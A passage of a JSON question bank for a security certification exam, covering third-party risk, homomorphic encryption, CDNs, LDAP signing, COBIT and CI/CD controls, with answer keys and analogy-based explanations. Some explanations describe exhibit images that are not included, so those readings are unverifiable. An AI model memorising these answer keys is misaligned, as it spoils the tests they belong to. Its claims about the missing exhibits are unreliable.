Information Security Officer (CISO) is developing a third-party risk management program and wants to establish an order of preference for solicitation and acceptance of audit and assessment results from business partners. The CISO prefers a formal certification against an established framework, which should be considered more reliable than self-attestations. Which of the following is most likely the reason for this perspective?","options":{"A":"Certifications are typically issued against a formal standard.","B":"Assessments are based on evidence, not judgments.","C":"For standards like PCI. self-attestations are more reliable than certifications.","D":"A certification audit is managed by a central authority."},"answer":"A","explanation":"A certification is an independent opinion against a named standard. A self-attestation is the vendor grading their own homework.\n\nThat is why the CISO ranks certifications first.\n\nImagine a health inspection certificate in the restaurant window versus the chef saying 'we're fine.'","choose":1,"pbq":false,"exhibits":[]},{"id":473,"domain":3,"stem":"Which of the following preconditions must be met in order for homomorphic encryption to become practical in mainstream data-in-use applications?","options":{"A":"Availability of updated ECC curves that provide quantum resistance","B":"Coprocessors made available with more appropriate security extensions","C":"Finalization of a standard PQC suite of lattice- and code-based algorithms","D":"Capability to run the most advanced LLMs while disconnected from the internet"},"answer":"B","explanation":"Homomorphic math is known; commodity chips still cannot run it fast enough. Better coprocessors (or similar accelerators) are the precondition the item is pointing at.\n\nImagine a recipe that only works with a commercial blast chiller while every home kitchen still has a mini-fridge.","choose":1,"pbq":false,"exhibits":[]},{"id":474,"domain":3,"stem":"A penetration tester reviews the following output: Which of the following mitigations should the security engineer recommend?","options":{"A":"Removing domain users from the administrator group on the reporting server","B":"Disabling NTLM hash transmission over the network to prevent sniffing","C":"Blocking the Kerberos protocol on servers that are shared by many users","D":"Implementing password complexity requirements in the domain"},"answer":"A","explanation":"The output shows a reporting server where Domain Users are local admins. Take that group out so a stolen user token cannot own the box.\n\nImagine taking the “all employees” key off the server-room hook and leaving only the admin keys.","choose":1,"pbq":false,"exhibits":["exhibits/q474_1.png"]},{"id":475,"domain":3,"stem":"A company receives several complaints from customers regarding its website. An engineer implements a parser for the web server logs that generates the following output: Which of the following should the company implement to best resolve the issue?","options":{"A":"IDS","B":"CDN","C":"WAF","D":"NAC"},"answer":"B","explanation":"Customer complaints plus logs of slowness from many regions is a distance-and-load problem. A CDN puts copies near users so the origin stops drowning.\n\nImagine neighborhood ticket windows so fans stop lining up at one downtown booth.","choose":1,"pbq":false,"exhibits":["exhibits/q475_1.png"]},{"id":476,"domain":3,"stem":"During an assessment, a government organization realizes that its hardware baselines are not the same across all identical model numbers. The security team determines that employees are purchasing IT equipment from low-cost commercial vendors through a popular online marketplace. Which of the following is the best way to mitigate these findings?","options":{"A":"Document the reliability standards required for governmental processes","B":"Purchase an extended support contract","C":"Create an SBoM and perform active scans across the enterprise","D":"Implement supply chain illumination software"},"answer":"D","explanation":"Same model number, different guts, bought off a public marketplace is a counterfeit or gray-market supply-chain problem. Illumination tooling maps who really built and shipped the box.\n\nImagine a scanner that tells you whether the “name brand” charger in the cart is the factory one or a look-alike.","choose":1,"pbq":false,"exhibits":[]},{"id":477,"domain":3,"stem":"A company wants to develop a new system that will be exposed to the internet and communicate via standard REST calls. The system in development can either provide users with information or process certain business transactions based on automated requests. Which of the following systems should the company develop?","options":{"A":"An identity provider","B":"A centralized API gateway","C":"A reverse proxy","D":"A load balancer"},"answer":"B","explanation":"Public REST that both serves data and runs transactions needs one front door that can authenticate, rate-limit, and route. That door is an API gateway.\n\nImagine one ticket window that checks IDs and then sends people to either “information” or “cashier.”","choose":1,"pbq":false,"exhibits":[]},{"id":478,"domain":3,"stem":"A penetration tester performed an exploit depicted in the following diagram: The systems in question are the following: Which of the following is the best option to remediate this attack?","options":{"A":"Enabling TLS 1.3 protocol","B":"Deploying an alternate domain controller for redundancy using LDAP GC port 3389","C":"Using end-to-end encryption with LDAP signing","D":"Performing hash values checks on the domain controller filesystem"},"answer":"C","explanation":"The diagram is an LDAP bind or relay that reads directory traffic in the clear. LDAP signing (and LDAPS) stops an on-path actor from reading or changing those binds.\n\nImagine sealing the inter-office envelope so the mailroom cannot photocopy the org chart.","choose":1,"pbq":false,"exhibits":["exhibits/q478_1.png","exhibits/q478_2.png"]},{"id":479,"domain":1,"stem":"A company needs to increase the maturity level for the cybersecurity department's governance structure. To achieve this goal, the company wants to implement a set of controls that can be used as part of the standard operational procedures and policies within the department and the company. Which of the following frameworks best aligns with this goal?","options":{"A":"ITIL","B":"CIS","C":"COSO","D":"COBIT"},"answer":"D","explanation":"Raising cybersecurity governance maturity with controls that become standard procedures is COBIT's job: IT governance mapped into process.\n\nITIL is service management. CIS is technical safeguards. COSO is enterprise internal control.\n\nImagine a management operating system for how security decisions get made, not a patch checklist.","choose":1,"pbq":false,"exhibits":[]},{"id":480,"domain":3,"stem":"A cloud engineer must develop IaC solutions to automate cloud resource creation using a code management platform as part of a CI/CD pipeline. During design reviews, the engineer must prevent drift of production-ready artifacts, as well as mechanisms to provide attestation for using the versioning platform. Which of the following are the most appropriate for the engineer to include? (Choose two.)","options":{"A":"Code signing","B":"Dynamic application security testing","C":"Regression testing","D":"Software composition analysis","E":"Automated unit testing","F":"Branch protection"},"answer":"A,F","explanation":"IaC in CI/CD must not drift and must prove which version shipped. Branch protection stops surprise commits to the release branch; code signing attests the artifact that left that branch.\n\nImagine a locked editor’s desk for the final manuscript plus a wax seal on the printed book.","choose":2,"pbq":false,"exhibits":[]},{"id":481,"domain":3,"stem":"A company updates its cloud-based services by saving infrastructure code in a remote repository. The code is automatically deployed into the development environment every time the code is saved to the repository. The developers express concern that the deployment often fails, citing minor code issues and occasional security control check failures in the development environment. Which of the following should a security engineer recommend to reduce the deployment failures? (Choose two.)","options":{"A":"Software composition analysis","B":"Pre-commit code linting","C":"Repository branch protection","D":"Automated regression testing","E":"Code submit authorization workflow","F":"Pipeline compliance scanning"},"answer":"B,F","explanation":"Tiny syntax bugs and occasional security misses blow up auto-deploys. Lint before the commit so garbage never lands, and scan the pipeline so policy failures still stop the push.\n\nImagine a spell-check as you type and a second inspector at the loading dock.","choose":2,"pbq":false,"exhibits":[]},{"id":482,"domain":1,"stem":"A software security architect is performing threat modeling on a new authentication system with a portal to access all of the internal applications. Given the output from the threat-modeling session in the following table: Which of the following mitigations reduces the overall risk from the threat model?","options":{"A":"Base lining the system to require enrollment in multifactor authentication","B":"Configuring rate limiting for all authentication and registration requests","C":"Enforcing hardware-based authentication for all administrative users","D":"Implementing strong identity proofing procedures as part of user onboarding"},"answer":"B","explanation":"The threat-model table is dominated by flooding authentication and registration — automated guessing and inbox bombs — not by a missing second factor on day one.\n\nRate limiting those requests cuts that flood. MFA and proofing help other rows.\n\nImagine a ticket window that only sells ten tickets a minute so a crowd cannot crush the clerk. That is this table's first fix.","choose":1,"pbq":false,"exhibits":["exhibits/q482_1.png"]}]};
